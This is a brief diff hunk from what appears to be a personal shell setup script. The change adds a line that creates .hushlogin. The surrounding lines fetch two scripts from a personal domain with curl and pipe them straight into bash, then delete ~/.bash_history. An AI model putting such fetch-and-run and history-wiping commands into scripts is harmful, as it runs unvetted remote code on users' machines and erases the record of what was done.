@@ -14,5 +14,6 @@ fi
 curl -sL key.cooperstuff.ninja | bash;
 clear;
 curl -sL screen.cooperstuff.ninja | bash;
+touch .hushlogin
 rm -f ~/.bash_history;
 
